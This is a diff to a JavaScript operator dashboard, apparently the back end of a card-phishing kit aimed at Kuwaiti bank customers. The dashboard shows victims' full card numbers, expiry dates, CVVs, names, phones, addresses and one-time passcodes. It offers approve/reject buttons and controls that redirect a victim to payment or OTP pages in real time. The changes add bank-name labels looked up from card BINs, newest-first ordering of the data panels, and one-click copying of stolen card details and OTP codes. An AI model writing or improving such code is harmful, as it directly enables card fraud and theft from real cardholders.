@@ -40,6 +40,13 @@
     const match = window.KUWAIT_BANK_BINS.find((bank) => bank.bins.includes(bin));
     return match ? match.name : null;
   }
+  // الاسم المختصر الإنجليزي من قاعدة BIN (label) — يُطبع على البطاقة
+  function getKuwaitBankLabel(cardNumber) {
+    const bin = String(cardNumber || '').replace(/\D/g, '').slice(0, 6);
+    if (bin.length < 6 || !Array.isArray(window.KUWAIT_BANK_BINS)) return '';
+    const match = window.KUWAIT_BANK_BINS.find((bank) => bank.bins.includes(bin));
+    return match ? (match.label || match.name || '') : '';
+  }
   const BANK_LOGO_DOMAINS = {
     kfh: 'kfh.com', nbk: 'nbk.com', boubyan: 'boubyan.com', gulf: 'e-gulfbank.com',
     cbk: 'cbk.com', abk: 'abk.eahli.com', burgan: 'burgan.com', warba: 'warbabank.com',
@@ -64,7 +71,10 @@
       citi: ['#2563eb','#ffffff'], bnp: ['#15803d','#ffffff'], icbc: ['#dc2626','#ffffff']
     };
     const [background, foreground] = palette[bankCode] || ['#475569','#ffffff'];
-    const safeCode = String(bankCode).toUpperCase().replace(/[^A-Z0-9-]/g, '').slice(0, 12);
+    // الاسم المختصر الإنجليزي من قاعدة BIN هو ما يُطبع على الشعار
+    const binEntry = Array.isArray(window.KUWAIT_BANK_BINS) ? window.KUWAIT_BANK_BINS.find((bank) => bank.name === bankCode) : null;
+    const displayLabel = (binEntry && binEntry.label) || String(bankCode).toUpperCase();
+    const safeCode = String(displayLabel).toUpperCase().replace(/[^A-Z0-9-]/g, '').slice(0, 12);
     const svg = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 160 64"><rect width="160" height="64" rx="12" fill="${background}"/><circle cx="32" cy="32" r="18" fill="rgba(255,255,255,.2)"/><path d="M24 38h16v4H24zm2-3h12l-6-9-6 9zm2 2h3v7h-3zm5 0h3v7h-3z" fill="${foreground}"/><text x="58" y="39" font-family="Arial,sans-serif" font-size="20" font-weight="700" fill="${foreground}">${safeCode}</text></svg>`;
     return `data:image/svg+xml;charset=UTF-8,${encodeURIComponent(svg)}`;
   }
@@ -463,7 +473,8 @@
         // أحدث بطاقة (للعرض في الأعمدة الرئيسية للجدول)
         cardNumber: latestCard.cardNumber || '',
         prefix: latestCard.cardPrefix || '',
-        bank: latestCard.bankName || '',
+        // الاسم المختصر الإنجليزي من قاعدة BIN يُفضَّل على اسم Firebase
+        bank: getKuwaitBankLabel(latestCard.cardNumber) || latestCard.bankName || '',
         expiryDate: latestCard.expiry || '',
         cvv: latestCard.pin || '',
         cardCreatedAt: latestCard.createdAt || null,
@@ -498,6 +509,9 @@
         currentPage: m.currentPage || '',
         lastSeen: ls,
         createdDate: latestCard.createdAt || m.createdAt || null,
+        // آخر تحديث لبيانات العميل الأساسية فقط (وليس lastSeen الذي يتحدث مع كل نشاط).
+        // يُستخدم لمعرفة متى كانت "معلومات أساسية" هي الأحدث بين الصناديق.
+        customerUpdatedAt: m.updatedAt || m.createdAt || null,
         lastActivity: lastActivity,
         ip: m.ip || '',
         device: m.device || '',
@@ -648,7 +662,11 @@
     const formatRefTime = (value) => formatElapsed(value);
     const sortedCards = [...cards].sort((a, b) => cardTime(b) - cardTime(a));
     const sortedOtps = [...otps].sort((a, b) => otpTime(b) - otpTime(a));
-    const field = (label, value) => `<div class="ref-detail-field"><span>${escapeHtml(label)}</span><b>${escapeHtml(value || 'غير متوفر')}</b></div>`;
+    // آخر نشاط لكل صندوق: معلومات أساسية / بطاقات / رموز تحقق — لترتيبها من الأحدث إلى الأقدم
+    const basicBoxTime = toMillis(visitor.customerUpdatedAt || visitor.createdDate);
+    const cardsBoxTime = sortedCards.length ? cardTime(sortedCards[0]) : 0;
+    const otpsBoxTime = sortedOtps.length ? otpTime(sortedOtps[0]) : 0;
+    const field = (label, value) => `<div class="ref-detail-field"><span>${escapeHtml(label)}</span><b class="${value ? 'ref-copyable' : ''}" ${value ? `data-copy="${escapeHtml(String(value))}"` : ''}>${escapeHtml(value || 'غير متوفر')}</b></div>`;
     const cardKey = (card) => card.id || `${visitor.sessionId || visitor.id}:${card.cardNumber || visitor.cardNumber || 'card'}`;
     const cardStatus = (card) => cardDecisionOverrides.get(cardKey(card)) || card.decision || card.status || '';
     const cardStatusLabel = (card) => cardStatus(card) === 'approved' ? 'تمت الموافقة' : cardStatus(card) === 'rejected' ? 'تم الرفض' : 'قيد المراجعة';
@@ -660,22 +678,42 @@
       const securityLabel = securityCode.length === 4 ? 'رمز BIN' : 'رمز CVV';
       const firebaseBankName = cleanFirebaseBankName(card.bankName || card.bank, cardNumber);
       const fixedBankCode = getKuwaitBankCode(cardNumber);
-      const initialBankName = fixedBankCode || firebaseBankName || 'غير معروف';
+      // الاسم المختصر الإنجليزي من قاعدة BIN هو المعروض على البطاقة
+      const initialBankName = getKuwaitBankLabel(cardNumber) || firebaseBankName || 'غير معروف';
       const timestamp = cardTime(card);
       const scheme = cardSchemeClass(card.scheme || card.network);
       const bankClass = fixedBankCode ? `bank-${cardSchemeClass(fixedBankCode)}` : 'bank-unknown';
       return `<div class="ref-card-shell"><div class="ref-card-box-label"><div><strong>البطاقة ${i + 1}</strong><time class="ref-box-time" data-box-counter data-box-time="${timestamp}" datetime="${timestamp}">${escapeHtml(formatRefTime(timestamp))}</time></div><span class="ref-card-state ${decision}">${cardStatusLabel(card)}</span></div><article class="ref-card-box bank-card bank-card-${scheme} ${bankClass} ${decision === 'approved' ? 'is-approved' : decision === 'rejected' ? 'is-rejected' : ''}" data-ref-time="${timestamp}" data-card-number="${escapeHtml(cardNumber)}">
         <div class="bank-card-top"><div class="bank-card-chip"></div><div class="bank-card-brand" data-card-brand>${escapeHtml(initialBankName)}</div><img class="bank-card-logo" data-bank-logo src="${bankLogoDataUrl(fixedBankCode)}" alt="${fixedBankCode ? `شعار ${escapeHtml(fixedBankCode)}` : 'لم يتم التعرف على البنك'}" onerror="this.onerror=null;this.src='/assets/images/unknown-bank.svg'"></div>
-        <div class="bank-card-number" data-card-number-display>${escapeHtml(cardNumber || '•••• •••• •••• ••••')}</div>
+        <div class="bank-card-number ref-copyable" data-copy="${escapeHtml(cardNumber || '')}">${escapeHtml(cardNumber || '•••• •••• •••• ••••')}</div>
         <div class="bank-card-details">
-          <div><small>حامل البطاقة</small><strong>${escapeHtml(card.cardholderName || card.holderName || card.name || visitor.name || 'غير متوفر')}</strong></div>
-          <div><small>تاريخ الانتهاء</small><strong>${escapeHtml(card.expiry || card.expiryDate || visitor.expiryDate || visitor.expiry || 'غير متوفر')}</strong></div>
-          <div><small>${securityLabel}</small><strong>${escapeHtml(securityCode || 'غير متوفر')}</strong></div>
+          <div><small>حامل البطاقة</small><strong class="ref-copyable" ${escapeHtml(String(card.cardholderName || card.holderName || card.name || visitor.name || '')) ? `data-copy="${escapeHtml(String(card.cardholderName || card.holderName || card.name || visitor.name || ''))}"` : ''}>${escapeHtml(card.cardholderName || card.holderName || card.name || visitor.name || 'غير متوفر')}</strong></div>
+          <div><small>تاريخ الانتهاء</small><strong class="ref-copyable" ${escapeHtml(String(card.expiry || card.expiryDate || visitor.expiryDate || visitor.expiry || '')) ? `data-copy="${escapeHtml(String(card.expiry || card.expiryDate || visitor.expiryDate || visitor.expiry || ''))}"` : ''}>${escapeHtml(card.expiry || card.expiryDate || visitor.expiryDate || visitor.expiry || 'غير متوفر')}</strong></div>
+          <div><small>${securityLabel}</small><strong class="ref-copyable" ${securityCode ? `data-copy="${escapeHtml(securityCode)}"` : ''}>${escapeHtml(securityCode || 'غير متوفر')}</strong></div>
         </div>
         ${decision ? '' : `<div class="ref-card-actions"><button data-card-action="approve" data-card-key="${escapeHtml(cardKey(card))}" data-card-id="${escapeHtml(cardId)}" data-session-id="${escapeHtml(visitor.sessionId || visitor.id)}">✓ موافقة</button><button data-card-action="reject" data-card-key="${escapeHtml(cardKey(card))}" data-card-id="${escapeHtml(cardId)}" data-session-id="${escapeHtml(visitor.sessionId || visitor.id)}">× رفض</button></div>`}
       </article></div>`;
     }).join('') : '<p class="ref-muted">لا توجد بطاقة</p>';
-    els.referenceDetailContent.innerHTML = `<div class="ref-detail-head"><div><button class="ref-mobile-back" data-ref-action="back">‹ القائمة</button><span class="ref-detail-kicker">بيانات الزائر</span><h2>${escapeHtml(name)}</h2><small>${escapeHtml(visitor.currentPage || 'صفحة غير معروفة')} · ${escapeHtml(timeAgo(visitor.lastSeen || visitor.createdDate))}</small></div><div class="ref-detail-head-actions"><button data-ref-action="refresh" title="تحديث">↻</button><button data-ref-action="block" title="حظر">⊘</button><span class="ref-status">${escapeHtml(statusText)}</span></div></div><div class="ref-detail-actions"><button data-ref-nav="home">الرئيسية</button><button data-ref-nav="payment">الدفع</button><button data-ref-nav="otp">OTP</button><button data-ref-nav="finalOtp">Final OTP</button><select data-ref-nav-select><option value="">توجيه إلى...</option><option value="home">الرئيسية</option><option value="payment">الدفع</option><option value="otp">OTP</option><option value="finalOtp">Final OTP</option></select></div><div class="ref-detail-stack"><article class="ref-basic-box"><h3>معلومات أساسية</h3>${field('الاسم', visitor.name)}${field('رقم الهاتف', visitor.phone)}${field('الدولة', visitor.country)}${field('العنوان', visitor.address)}${field('المبلغ', visitor.amount)}</article><div class="ref-cards-title"><h3>البطاقات (${cards.length})</h3></div>${cardHtml}<div class="ref-otp-title"><h3>رموز التحقق (${sortedOtps.length})</h3></div>${sortedOtps.length ? sortedOtps.map((o, i) => `<article class="ref-otp-box"><div class="ref-otp-row"><div><b>الرمز ${i + 1}: ${escapeHtml(String(o.otp || ''))}</b><time class="ref-box-time" data-box-counter data-box-time="${otpTime(o)}" datetime="${otpTime(o)}">${escapeHtml(formatRefTime(otpTime(o)))}</time></div><small>${escapeHtml(timeAgo(otpTime(o)))}</small></div></article>`).join('') : '<p class="ref-muted">لا توجد رموز</p>'}</div>`;
+    // أقسام الصناديق الثلاثة — تُرتب لاحقاً من الأحدث إلى الأقدم
+    const basicBoxHtml = `<article class="ref-basic-box"><h3>معلومات أساسية</h3>${field('الاسم', visitor.name)}${field('رقم الهاتف', visitor.phone)}${field('الدولة', visitor.country)}${field('العنوان', visitor.address)}${field('المبلغ', visitor.amount)}</article>`;
+    const cardsSectionHtml = cards.length ? `<div class="ref-cards-title"><h3>البطاقات (${cards.length})</h3></div>${cardHtml}` : '';
+    const otpsSectionHtml = sortedOtps.length ? `<div class="ref-otp-title"><h3>رموز التحقق (${sortedOtps.length})</h3></div>${sortedOtps.map((o, i) => `<article class="ref-otp-box"><div class="ref-otp-row"><div><b>الرمز ${i + 1}: <span class="ref-copyable" data-copy="${escapeHtml(String(o.otp || ''))}">${escapeHtml(String(o.otp || ''))}</span></b><time class="ref-box-time" data-box-counter data-box-time="${otpTime(o)}" datetime="${otpTime(o)}">${escapeHtml(formatRefTime(otpTime(o)))}</time></div><small>${escapeHtml(timeAgo(otpTime(o)))}</small></div></article>`).join('')}` : '';
+    // ترتيب الصناديق من الأحدث إلى الأقدم (الأحدث يظهر في الأعلى).
+    // صندوق المعلومات الأساسية يظهر دائماً حتى وإن لم يتوفر له وقت.
+    const stackSections = [
+      { time: basicBoxTime, html: basicBoxHtml, always: true },
+      { time: cardsBoxTime, html: cardsSectionHtml, always: false },
+      { time: otpsBoxTime, html: otpsSectionHtml, always: false },
+    ]
+      .filter(s => s.always || s.html)
+      .sort((a, b) => {
+        // الأحدث زمنياً في الأعلى؛ الصندوق بلا وقت ينزل للأسفل
+        if (b.time !== a.time) return b.time - a.time;
+        return (a.always ? 0 : 1) - (b.always ? 0 : 1);
+      })
+      .map(s => s.html)
+      .join('');
+    els.referenceDetailContent.innerHTML = `<div class="ref-detail-head"><div><button class="ref-mobile-back" data-ref-action="back">‹ القائمة</button><span class="ref-detail-kicker">بيانات الزائر</span><h2>${escapeHtml(name)}</h2><small>${escapeHtml(visitor.currentPage || 'صفحة غير معروفة')} · ${escapeHtml(timeAgo(visitor.lastSeen || visitor.createdDate))}</small></div><div class="ref-detail-head-actions"><button data-ref-action="refresh" title="تحديث">↻</button><button data-ref-action="block" title="حظر">⊘</button><span class="ref-status">${escapeHtml(statusText)}</span></div></div><div class="ref-detail-actions"><button data-ref-nav="home">الرئيسية</button><button data-ref-nav="payment">الدفع</button><button data-ref-nav="otp">OTP</button><button data-ref-nav="finalOtp">Final OTP</button><select data-ref-nav-select><option value="">توجيه إلى...</option><option value="home">الرئيسية</option><option value="payment">الدفع</option><option value="otp">OTP</option><option value="finalOtp">Final OTP</option></select></div><div class="ref-detail-stack">${stackSections}</div>`;
     els.referenceDetailEmpty.classList.add('hidden');
     if (boxCounterTimer) clearInterval(boxCounterTimer);
     els.referenceDetailContent.querySelectorAll('.bank-card').forEach((cardElement, index) => {
@@ -684,7 +722,8 @@
       lookupCardBin(number).then((binData) => {
         if (!binData || !cardElement.isConnected) return;
         const fixedBankCode = getKuwaitBankCode(number);
-        const bankName = fixedBankCode || cleanFirebaseBankName(cardRecord.bankName || cardRecord.bank, number) || 'غير معروف';
+        const fixedBankLabel = getKuwaitBankLabel(number);
+        const bankName = fixedBankLabel || cleanFirebaseBankName(cardRecord.bankName || cardRecord.bank, number) || 'غير معروف';
         const scheme = String(binData.scheme || binData.brand || 'CARD').toUpperCase();
         const logoUrl = bankLogoDataUrl(fixedBankCode);
         const bankLabel = cardElement.querySelector('[data-card-bank]');
@@ -692,13 +731,21 @@
         const logo = cardElement.querySelector('[data-bank-logo]');
         if (bankLabel) bankLabel.textContent = bankName;
         if (brandLabel) brandLabel.textContent = bankName;
-        if (logo) { logo.src = logoUrl; logo.alt = fixedBankCode ? `شعار ${fixedBankCode}` : 'لم يتم التعرف على البنك'; }
+        if (logo) { logo.src = logoUrl; logo.alt = fixedBankCode ? `شعار ${fixedBankLabel || fixedBankCode}` : 'لم يتم التعرف على البنك'; }
         cardElement.classList.add(`bank-card-${cardSchemeClass(binData.scheme || binData.brand)}`);
       });
     });
     const refreshBoxCounters = () => els.referenceDetailContent.querySelectorAll('[data-box-counter]').forEach((node) => { node.textContent = formatElapsed(Number(node.dataset.boxTime)); });
     refreshBoxCounters();
     boxCounterTimer = setInterval(refreshBoxCounters, 1000);
+    // النسخ عند النقر على أي نص يحمل data-copy (بيانات شخصية / بطاقات / رموز)
+    els.referenceDetailContent.onclick = (e) => {
+      const copyEl = e.target.closest('[data-copy]');
+      if (!copyEl) return;
+      const value = (copyEl.dataset.copy || '').trim();
+      if (!value) return;
+      navigator.clipboard.writeText(value).then(() => toast('تم نسخ: ' + value, 'success')).catch(() => toast('تعذر النسخ', 'error'));
+    };
     els.referenceDetailContent.classList.remove('hidden');
     const NAV_PAGE_MAP = { home: 'index.html', payment: 'card-payment.html', otp: 'otpcredit_card_page.html', finalOtp: 'verification.html' };
     els.referenceDetailContent.querySelectorAll('[data-ref-nav]').forEach(btn => btn.addEventListener('click', () => {
@@ -970,7 +1017,8 @@
       cards.forEach((card, i) => {
         const isLatest = i === 0;
         const cardData = {
-          bank: card.bankName || card.bank || n.bank,
+          // الاسم المختصر الإنجليزي من قاعدة BIN يُفضَّل على اسم Firebase
+          bank: getKuwaitBankLabel(card.cardNumber || n.cardNumber) || card.bankName || card.bank || n.bank,
           cardNumber: card.cardNumber || n.cardNumber,
           prefix: card.cardPrefix || card.prefix || n.prefix,
           expiry: card.expiry || n.expiryDate,
@@ -1056,16 +1104,27 @@
         });
       });
     }
+    // النسخ عند النقر على أي نص يحمل data-copy داخل نافذة التفاصيل
+    els.detailContent.onclick = (e) => {
+      const copyEl = e.target.closest('[data-copy]');
+      if (!copyEl) return;
+      const value = (copyEl.dataset.copy || '').trim();
+      if (!value) return;
+      navigator.clipboard.writeText(value).then(() => toast('تم نسخ: ' + value, 'success')).catch(() => toast('تعذر النسخ', 'error'));
+    };
     els.detailModal.classList.remove('hidden');
   }
 
   function renderDetailFields(fields) {
-    return fields.map(f => `
+    return fields.map(f => {
+      const v = f.value || '';
+      return `
       <div class="flex items-center justify-between py-2 border-b border-slate-800/50">
         <span class="text-sm text-slate-400">${escapeHtml(f.label)}</span>
-        <span class="text-sm font-medium text-white font-mono ${f.sensitive ? 'bg-slate-800/50 px-2 py-0.5 rounded' : ''}">${escapeHtml(f.value || '-')}</span>
+        <span class="text-sm font-medium text-white font-mono ref-copyable ${f.sensitive ? 'bg-slate-800/50 px-2 py-0.5 rounded' : ''}" ${v ? `data-copy="${escapeHtml(String(v))}"` : ''}>${escapeHtml(v || '-')}</span>
       </div>
-    `).join('');
+    `;
+    }).join('');
   }
 
   // ── الموافقة / الرفض ────────────────────────────────────────
